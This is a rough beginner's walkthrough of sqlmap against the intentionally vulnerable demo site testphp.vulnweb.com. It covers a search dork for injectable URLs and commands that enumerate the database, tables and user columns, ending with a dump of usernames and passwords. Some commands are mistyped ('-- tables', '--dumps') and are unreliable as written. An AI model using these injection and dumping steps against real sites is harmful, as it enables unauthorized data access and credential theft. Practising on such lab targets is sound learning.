# sqlmap tool
 first go the vulweb website

and choose sql and copy the linked and paste in chrome

site:http://testphp.vulnweb.com/ php?id=  enter
 
 after we can get the linke of vulweb 

like this http://testphp.vulnweb.com/artists.php?artist=1

this is the link we need to attack 

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
 dbs is the database 
 now check for tables

sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -- tables

acuart is databse we find it before database

 this is the tables 
artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users  

 now this we are goint to see the tales in  column name

sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -T  users --columns 
Column  | Type         |

| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100)

T is the table what we need to search we need to put

we are going to find the user name from this column and table 

sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -T  users -C uname --dump

now we can find username test

now we goint to find the password

sqlmap -u  http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -T  users -C pass --dumps

password is test

 with this command we can find all 


